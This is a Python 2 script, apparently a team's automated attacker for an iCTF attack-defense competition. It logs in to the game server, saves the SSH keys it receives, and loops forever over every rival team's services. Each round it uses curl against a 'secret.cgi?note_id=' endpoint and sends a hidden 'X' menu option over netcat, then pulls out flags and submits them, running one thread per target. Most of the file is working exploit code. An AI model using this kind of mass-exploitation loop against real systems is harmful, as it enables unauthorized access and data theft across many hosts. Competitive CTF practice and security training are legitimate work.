from ictf import iCTF
import os
import time
import paramiko
import json, ast
import thread
import pwn
import subprocess
import re
fails={}
IP = '172.31.129.'
count=0
# def encode_dict(d, codec='utf8'):
#     ks = d.keys()
#     for k in ks:
#         val = d.pop(k)
#         if isinstance(val, unicode):
#             val = val.encode(codec)
#         elif isinstance(val, dict):
#             val = encode_dict(val, codec)
#         if isinstance(k, unicode):
#             k = k.encode(codec)
#         d[k] = val
#     return d


def attack_web(t, service, target,ctf_key):
    host = target['hostname']
    host = host[4:]
    hostIp = IP + host
    flagId = target['flag_id']
    ip = key_info['ip']
    command = 'curl ' + str(hostIp) + ':' + str(target['port']) + '/secret.cgi?note_id=' + str(flagId)
    # conn = paramiko.SSHClient()
    # conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # conn.connect( hostname = ip,username="ctf",port =key_info['port'], pkey = ctf_key )
    try:
        #stdin, stdout, stderr = conn.exec_command(command)
        r = shell.run(command)
        tmpAns = r.recvline()
        obj = re.search(r'FLG(.{13})', tmpAns, re.M | re.I)
        ans = obj.group()
        print ans
        t.submit_flag([ans])
        r.close()
    except:
        global fails
        obj=[hostIp,target["team_name"]]
        if target["port"] in fails:
            fails[target["port"]].append(obj)
        else:
            fails[target["port"]]=[obj]


    # proc = subprocess.Popen([command], stdout=subprocess.PIPE, shell=True)
    # (out, err) = proc.communicate()
    # out = out.split(',')[0]
    # try:
    #     t.submit_flag([out])
    # except:
    #     pass

    #     with open("Defending", "a") as myfile:
    #         myfile.write(service['authors'])
    #     print service['authors'], target['hostname'].split('.')[-1]
    # time.sleep(8)
    # t.submit_flag()

def attack_binary(t,service,target,ctf_key):
    # print "ATTACK"
    host = target['hostname']
    host = host[4:]
    hostIp = IP + host
    flagId = target['flag_id']
    # shell = pwn.ssh(host=key_info['ip'], user="ctf", port=key_info['port'],
    #                 key=ctf_key )
    try:
        r = shell.run("nc " + hostIp + " " + str(target["port"]))
        r.recvuntil("Want to (R)ead or (W)rite a note?")
        r.send("X\n")
        r.recvuntil("Which note?")
        r.recvline()
        r.send(flagId)
        r.send("\n")
        tmpAns = r.recvline()
        obj = re.search(r'FLG(.{13})', tmpAns, re.M | re.I)
        ans = obj.group()
        print ans
        t.submit_flag([ans])
        r.close()
    except:
        global fails
        obj=[hostIp,target["team_name"]]
        if target["port"] in fails:
            fails[target["port"]].append(obj)
        else:
            fails[target["port"]]=[obj]
        print "Error on IP " + hostIp

def attack_py(t,service,target,ctf_key):
    # print "ATTACK"
    host = target['hostname']
    host = host[4:]
    hostIp = IP + host
    flagId = target['flag_id']

    try:
        r = shell.run("nc "+hostIp+ " "+str(target["port"]))
        r.recvuntil("Want to (R)ead or (W)rite a note?")
        r.send("X\n")
        r.recvuntil("Which note?")
        r.recvline()
        r.send(flagId)
        r.send("\n")
        tmpAns = r.recvline()
        obj = re.search(r'FLG(.{13})', tmpAns, re.M | re.I)
        ans = obj.group()
        print ans
        t.submit_flag([ans])
        r.close()
    except:
        global fails
        obj=[hostIp,target["team_name"]]
        if target["port"] in fails:
            fails[target["port"]].append(obj)
        else:
            fails[target["port"]]=[obj]


# Config File read
import json

with open('config.json') as json_data_file:
    config = json.load(json_data_file)
print(config)


# Login to iCTF server and get ssh keys of our server
ictf = iCTF(config["ctf_ip"])
t = ictf.login(config["team_id"],config["team_pass"])
key_info = t.get_ssh_keys()
print json.dumps(key_info, indent=4, sort_keys=True)

with open('Run_Status', 'wb') as f:
    f.write("\n")

with open('ctf_key', 'wb') as f:
    f.write(key_info['ctf_key'])

with open('root_key', 'wb') as f:
    f.write(key_info['root_key'])

chmod_command = "chmod 600 ctf_key"
os.system(chmod_command)
chmod_command = "chmod 600 root_key"
os.system(chmod_command)


# Command to remotely connect server

# ip = key_info['ip']
# port_no = str(key_info['port'])
# path_to_key = 'root_key'
#
# key = paramiko.RSAKey.from_private_key_file("ctf_key")
# conn = paramiko.SSHClient()
# conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
# print ip
# print "connecting"
# conn.connect( hostname = ip,username="ctf",port =key_info['port'], pkey = key )
# stdin, stdout, stderr = conn.exec_command('ls -la')
# print stdout.readlines()
# conn.close()

# While loop to attack again and again after some time delay
ctf_key=paramiko.RSAKey.from_private_key_file("ctf_key")
shell = pwn.ssh(host=key_info['ip'], user="ctf", port=key_info['port'],
                    key=ctf_key,timeout=30)
while(True):
    fails = {}
    services= t.get_service_list()
    for service in services:
        print json.dumps(service, indent=4, sort_keys=True)
        targets=t.get_targets(service['service_id'])
        # print json.dumps(targets, indent=4, sort_keys=True)
        for target in targets["targets"]:
            print json.dumps(target, indent=4, sort_keys=True)
            if target['port']==config["service_id_binary"]:
                thread.start_new_thread(attack_binary, (t,service,target,ctf_key))
                time.sleep(0.5)
            elif target['port']==config["service_id_py"]:
                thread.start_new_thread(attack_py, (t,service,target,ctf_key))
                time.sleep(0.5)
            elif target['port']==config["service_id_web"]:
                print 'starting a new thread for web'
                thread.start_new_thread(attack_web, (t,service, target,ctf_key))
                time.sleep(0.5)
            else:
                pass


        # #Attack
        # if target['port'] == 20003:
        #     host = target['hostname']
        #     host = host[4:]
        #     hostIp = IP + host
        #     flagId = target['flag_id']
        #
        #     command = 'curl ' + str(hostIp) + ':' + str(target['port']) + '/secret.cgi?note_id=' + str(flagId)
        #     os.system(command)
        #     print command
        #     # proc = subprocess.Popen([command], stdout=subprocess.PIPE, shell=True)
        #     # (out, err) = proc.communicate()
        #     # print "program output:", out
    count=count+1
    with open('Run_Status', 'a') as f:
        f.write("\n")
        f.write("Time: "+time.asctime( time.localtime(time.time()))+" Run Number: "+str(count))
        f.write("\n")
        f.write(json.dumps(fails, indent=4, sort_keys=True))
    time.sleep(config["delay"])